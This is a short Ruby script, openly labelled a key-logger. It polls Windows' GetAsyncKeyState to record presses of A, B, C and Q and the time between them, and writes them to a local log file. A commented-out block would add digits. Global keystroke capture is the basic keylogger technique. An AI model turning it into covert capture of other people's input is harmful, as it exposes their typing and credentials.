#Simple key-logger in Ruby
#author: asutosh

require 'Win32API'
class Keys_To_Capture
  attr_reader :char, :total_time, :counter

  def initialize(char)
    @total_time = 0
    @char = char
    @counter = 1
  end
end

class Key_Logs
  def open_file
    File.open('logs_' + Time.now.to_i.to_s + '.txt', 'a')
  end

  def save_file(files, text)
    #files = File.open(filename, 'a')
    files.puts text+"\n"
  end

  def capture_data

    nave = Win32API.new('user32', 'GetAsyncKeyState', ['i'], 'i')

    start_time = Time.now
    break_check = 'I' #Some junk

    files = open_file
    #we are keeping track of only A, B, C and Q: Quit
    characters = Array.new
    find_list = [0x41, 0x42, 0x43, 0x51]
    find_list.each { |var| characters << Keys_To_Capture.new(var) }
    #characters = Keys_To_Capture.new([0x41, 0x44, 0x53, 0x51])

    until break_check.eql?('Q')
      # (0x30..0x39).each do |num1| #numbers
      #   if nave.call(num1) & 0x01 == 1
      #     save_file(files, num1.chr)
      #   end
      # end

      characters.each do |key| #letters
        if nave.call(key.char) & 0x01 == 1
          break_check = key.char.chr
          if find_list.any? { |i| key.char.chr.include?(i.chr) }
            if key.counter == 1
              start_time = Time.now
              key.instance_variable_set('@counter', 2)
              break_check = key.char.chr
            else
              save_file(files, key.char.chr + ' ' + (Time.now - start_time).to_s)
              key.instance_variable_set('@counter', 1)
              key.instance_variable_set('@total_time', key.total_time + (Time.now - start_time))
              break_check = key.char.chr
            end
          end
        end
      end
    end

    #note the total time for each characters
    characters.each do |key|
      save_file(files, key.char.chr + ' - Total Time: ' +key.total_time.to_s)
    end

  end

  def capture_single_click

    nave = Win32API.new('user32', 'GetAsyncKeyState', ['i'], 'i')

    start_time = Time.now
    break_check = 'I' #Some junk
    first_time = 1
    temp_key = nil

    files = open_file
    #we are keeping track of only A, B, C and Q: Quit
    characters = Array.new
    find_list = [0x41, 0x42, 0x43, 0x51]
    find_list.each { |var| characters << Keys_To_Capture.new(var) }
    #characters = Keys_To_Capture.new([0x41, 0x44, 0x53, 0x51])

    until break_check.eql?('Q')
      # (0x30..0x39).each do |num1| #numbers
      #   if nave.call(num1) & 0x01 == 1
      #     save_file(files, num1.chr)
      #   end
      # end

      characters.each do |key| #letters
        if nave.call(key.char) & 0x01 == 1
          break_check = key.char.chr
          if find_list.any? { |i| key.char.chr.include?(i.chr) }
            if first_time == 1
              first_time += 1
              start_time = Time.now
              temp_key = key
            end
            save_file(files, temp_key.char.chr + ' ' + (Time.now - start_time).to_s)
            temp_key.instance_variable_set('@total_time', temp_key.total_time + (Time.now - start_time))
            start_time = Time.now
            temp_key = key
          end
        end
      end
    end

    #note the total time for each characters
    characters.each do |key|
      save_file(files, key.char.chr + ' - Total Time: ' +key.total_time.to_s)
    end

  end
end


Key_Logs.new.capture_single_click #Start the key-logger

# ¿ The End ?